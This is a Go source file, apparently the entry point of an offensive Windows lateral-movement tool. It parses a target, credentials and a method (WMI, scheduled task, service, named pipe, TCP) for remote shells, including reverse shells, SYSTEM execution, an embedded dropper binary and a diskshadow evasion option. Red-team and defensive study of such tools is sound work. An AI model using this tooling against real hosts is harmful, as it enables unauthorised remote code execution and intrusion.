package main

// TODO - Reduce code duplication across modules
// TODO - Automatically delete old Tasks/Services with option to preserve (-nodelete)
// TODO - For WMI, Incorporate runas - right now everything runs as the user in question, default should be SYSTEM
// TODO - Reduce code reuse/complexity - abstract components to higher level

import (
	_ "embed"
	"flag"
	"fmt"
	"log"
	"slices"
)

//go:embed gopipe.exe
var pipebin []byte

func main() {
	args, err := parseArgs()
	if err != nil {
		fmt.Println(err.Error())
		return
	}
	target := args["target"].(string)
	method := args["method"].(string)
	batch := args["batch"].(bool)
	username := args["username"].(string)
	password := args["password"].(string)
	domain := args["domain"].(string)
	name := args["name"].(string)
	runas := args["runas"].(bool)
	description := args["description"].(string)
	dropmethod := args["dropmethod"].(string)
	//evasion := args["evasion"].(string)
	reverse := args["reverse"].(bool)
	port := args["port"].(int)
	ip := args["ip"].(string)
	shell := args["shell"].(string)
	nodelete := args["nodelete"].(bool)

	log.Printf("Target: %s, Method: %s\n", target, method)

	/*	var smbsession *smb2.Session
		var smbconn net.Conn
		var cshare *smb2.Share
		if username != "" {
			smbsession, smbconn, err = getAuthenticatedSMBSession(username, password, domain, target)
			if err != nil {
				fmt.Printf("Failed to authenticate to SMB share: %v\n", err)
				return
			}
			smbsession.WithContext(context.Background())
			cshare, err = smbsession.Mount("C$")
			if err != nil {
				fmt.Printf("Failed to mount SMB share: %v\n", err)
				return
			}
			ipcshare, err := smbsession.Mount("IPC$")
			if err != nil {
				fmt.Printf("Failed to mount SMB share: %v\n", err)
				return
			}
			defer ipcshare.Umount()
			defer cshare.Umount()
			defer smbsession.Logoff()
			defer smbconn.Close()
		}*/

	if method == "wmi" {
		// Enter pseudo-interactive shell using WMI Process Creations
		// Supports username/password for authentication - must supply domain
		handleWMISession(target, batch, username, password, domain)
	} else if method == "task" {
		// Enter psuedo-interactive shell using Task Scheduler
		// By default, Scheduled Task will run as SYSTEM if we have Local Admin permissions
		// If you want to avoid this and run it as our admin account instead, pass -runas flag
		handleTaskSession(target, batch, username, password, domain, name, description, runas)
	} else if method == "service" {
		// Enter psuedo-interactive shell using Service Control Manager
		handleServiceSession(target, batch, username, password, domain, name, description, runas)
	} else if method == "pipe" {
		// Enter full-interactive shell using named pipes
		handlePipeSession(target, username, password, domain, name, dropmethod, runas, nodelete)
	} else if method == "tcp" {
		// Enter full-interactive shell using TCP Client/Server - can be bind or reverse shell
		handleTCP(target, username, password, domain, name, dropmethod, ip, shell, runas, reverse, port, nodelete)
	}

}

func parseArgs() (map[string]any, error) {

	target := flag.String("target", "", "Remote Hostname or IP address")
	method := flag.String("method", "wmi", "Method to use for remote execution (wmi, task, service, pipe, tcp)")
	batch := flag.Bool("batch", false, "If true, will copy commands to a batch file on target and execute rather than direct cmd execution - useful for long commands")

	// Credentials (optional depending on run-context)
	username := flag.String("user", "", "Username for remote authentication - if domain user, be sure to supply -domain flag")
	password := flag.String("pass", "", "Password for remote authentication")
	domain := flag.String("domain", "", "Domain for remote authentication - should be FQDN such as domain.com or similar - if blank and user is specified will assume local user")

	// Evasion
	// diskshadow - https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/
	evasion := flag.String("evasion", "", "conhost, diskshadow, ftp")

	// Service, Task, Pipe parameters
	name := flag.String("name", "", "Service/Task/Pipe name to use for remote execution - if blank, will generate a random name")
	description := flag.String("description", "", "Description for the service/task - if blank, will use a default description")
	runas := flag.Bool("runas", false, "If true, will run the task as the user specified in -user flag instead of SYSTEM assuming the user has the correct permissions - does NOT work yet for WMI which will always run as specified user")
	dropmethod := flag.String("dropmethod", "wmi", "Method to use for creating named pipe (wmi, task, service)")
	reverse := flag.Bool("reverse", false, "If true, will create a reverse shell instead of bind shell - for TCP mode - must specify port")
	port := flag.Int("port", 0, "Port to use for TCP shells - must specify port if using TCP mode")
	ip := flag.String("ip", "0.0.0.0", "IP to use for TCP reverse shells")
	shell := flag.String("shell", "cmd", "Shell to use for TCP shells - default is cmd.exe, valid options are (cmd, ps)")
	nodelete := flag.Bool("nodelete", false, "If true, will not delete the task/service after execution - useful to avoid constantly creating new tasks/services if reconnecting multiple times")
	flag.Parse()

	validMethods := []string{"wmi", "task", "service", "pipe", "tcp"}
	if !slices.Contains(validMethods, *method) {
		return nil, fmt.Errorf("invalid method: %s", *method)
	}

	validShells := []string{"cmd", "ps"}
	if !slices.Contains(validShells, *shell) {
		return nil, fmt.Errorf("invalid shell: %s", *shell)
	}
	if *shell == "ps" {
		*shell = "powershell.exe"
	} else if *shell == "cmd" {
		*shell = "cmd.exe"
	}

	if *target == "" {
		return nil, fmt.Errorf("target is required")
	}

	if *username != "" && *password == "" {
		return nil, fmt.Errorf("password is required if username is provided")
	}

	if *method == "tcp" {
		if *port == 0 {
			return nil, fmt.Errorf("port is required for TCP")
		}
		if *reverse && *ip == "0.0.0.0" {
			return nil, fmt.Errorf("IP is required with reverse shells for connect-back target")
		}
	}

	if *port != 0 && *method != "tcp" {
		return nil, fmt.Errorf("port is only valid for TCP method")
	}

	if *method == "service" || ((*method == "pipe" || *method == "tcp") && *dropmethod == "service") {
		if *runas && *password == "" {
			return nil, fmt.Errorf("password is required to install a 'runas' service")
		}
	}

	arguments := map[string]any{
		"target":      *target,
		"method":      *method,
		"batch":       *batch,
		"username":    *username,
		"password":    *password,
		"domain":      *domain,
		"name":        *name,
		"description": *description,
		"runas":       *runas,
		"evasion":     *evasion,
		"dropmethod":  *dropmethod,
		"reverse":     *reverse,
		"port":        *port,
		"ip":          *ip,
		"shell":       *shell,
		"nodelete":    *nodelete,
	}
	return arguments, nil
}
